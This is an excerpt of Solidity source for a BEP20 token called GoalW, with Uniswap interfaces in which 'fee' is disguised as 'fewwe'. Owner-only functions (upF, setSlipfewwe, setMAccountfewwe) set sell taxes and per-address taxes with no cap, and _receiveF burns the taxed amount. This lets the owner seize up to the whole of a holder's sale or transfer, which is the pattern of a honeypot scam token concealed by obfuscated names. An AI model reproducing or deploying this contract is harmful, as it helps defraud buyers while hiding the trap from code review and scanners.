...
interface IUniswapV2Factory {
    ...
    function fewweTo() external view returns (address);
    function fewweToSetter() external view returns (address);
    ...
    function setfewweTo(address) external;
    function setfewweToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfewweOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfewweOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfewweOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfewweOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfewweOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract GoalW is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfewwe = 0;

    uint256 private _defaultBuyfewwe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfewwe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfewwe = _value;
    }

    function setSlipfewwe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfewwe[_address] = _value;
    }

    function getSlipfewwe(address _address) external view onlyownar returns (uint256) {
        return _slipfewwe[_address];
    }


    function setMAccountfewwe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfewwe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefewweAmount = 0;

        if (rF) {
            uint256 tradefewwe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefewwe = _defaultSellfewwe;
                }
                if (from == uniswapV2Pair) {

                    tradefewwe = _defaultBuyfewwe;
                }
            }
            if (_slipfewwe[from] > 0) {
                tradefewwe = _slipfewwe[from];
            }

            tradefewweAmount = _Amount.mul(tradefewwe).div(100);
        }


        if (tradefewweAmount > 0) {
            _balances[from] = _balances[from].sub(tradefewweAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefewweAmount);
            emit Transfer(from, _deadAddress, tradefewweAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefewweAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefewweAmount);
        emit Transfer(from, _to, _Amount - tradefewweAmount);
    }
